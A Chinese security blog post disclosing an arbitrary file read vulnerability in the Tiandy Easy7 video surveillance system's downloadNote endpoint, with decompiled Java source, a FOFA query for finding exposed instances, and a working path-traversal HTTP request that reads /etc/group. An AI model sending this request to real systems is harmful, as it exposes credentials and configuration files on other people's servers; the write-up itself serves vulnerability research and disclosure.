---
title: "天地伟业Easy7 downloadNote 文件读取漏洞"
source: https://mrxn.net/jswz/easy7-file-downloadNote-file-read.html
asset_dir: assets/天地伟业easy7-downloadnote-文件读取漏洞
---

# 天地伟业Easy7 downloadNote 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/10 08:45
* 280浏览
* [0评论](#comment)
* 30分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的软件系统。

漏洞预警服务

该系统的/Easy7/rest/file/downloadNote接口存在前台任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者通过构造恶意路径参数（如/etc/passwd）可读取服务器上的任意文件，可能导致敏感信息泄露（如系统配置文件、用户凭证等）。由于天地伟业产品多用于关键基础设施领域，若存在公网暴露实例，可能带来严重的安全风险。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的漏洞接口 /Easy7/rest/file/downloadNote 的对应方法`downloadNote()`的实现逻辑

```
@Controller
@RequestMapping({"/file"})
public class CLS_REST_File {
    @Resource(
        name = "boSystemInfo"
    )
    private CLS_BO_SystemInfo boSystemInfo;
    @Resource(
        name = "boFile"
    )
    private CLS_BO_File boFile;
    @Resource(
        name = "boPROXY"
    )
    private CLS_BO_PROXY boPROXY;
    private static final Log log = LogFactory.getLog(CLS_REST_File.class);

    @RequestMapping({"/downloadNote"})
    public void downloadNote(HttpServletRequest request, HttpServletResponse response, CLS_VO_File voFile) throws IOException {
        String path = CLS_Easy7_Types.file_path;
        CLS_VO_Result result = new CLS_VO_Result();
        String fileName = voFile.getFileName();
        String fullName = voFile.getFullName();
        String newPath = path + fileName;
        File isFile = new File(newPath);
        if (!isFile.exists()) {
            result.setRet(-7);
            response.getWriter().print(JSONObject.fromObject(result));
        } else {
            ServletOutputStream out = response.getOutputStream();
            String retFilename = "";
            if (fullName != null && !"".equals(fullName)) {
                retFilename = fullName;
            } else {
                retFilename = fileName;
            }

            String ofileName = URLEncoder.encode(retFilename, "UTF-8");
            response.setHeader("Content-disposition", "attachment;filename=" + new String(ofileName.getBytes("UTF-8"), "UTF-8") + ".doc");
            BufferedInputStream bis = null;
            BufferedOutputStream bos = null;

            try {
                InputStream inputStream = new FileInputStream(newPath);
                bis = new BufferedInputStream(inputStream);
                bos = new BufferedOutputStream(out);
                byte[] buff = new byte[2048];

                int bytesRead;
                while((bytesRead = bis.read(buff, 0, buff.length)) != -1) {
                    bos.write(buff, 0, bytesRead);
                }

                this.forwardInquestLog(request.getLocalPort(), voFile.getFullName());
```

其中 `path = CLS_Easy7_Types.file_path;`为应用的根目录，然后将用户传递的参数`fileName`作为文件路径一部分传递进`new FileInputStream(newPath);`中进行文件操作，整个过程无任何校验或过滤，因此造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /Easy7/rest/file/downloadNote HTTP/1.1
Host: easy7.mrxn.net
Content-Type: application/x-www-form-urlencoded

fullName=1.png&fileName=../../../etc/group
```

[![天地伟业Easy7 downloadNote 文件读取漏洞](images/img-001-ea3a8bb27727.webp)](https://image.mrxn.net/a2a2d4eb2ef14175a7df8aa4c4cb4c07.webp)

成功读取到/etc/group文件内容

计算机科学

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天地伟业Easy7 downloadNote 文件读取漏洞](https://mrxn.net/jswz/easy7-file-downloadNote-file-read.html)  
文章链接：<https://mrxn.net/jswz/easy7-file-downloadNote-file-read.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-file-downloadNote-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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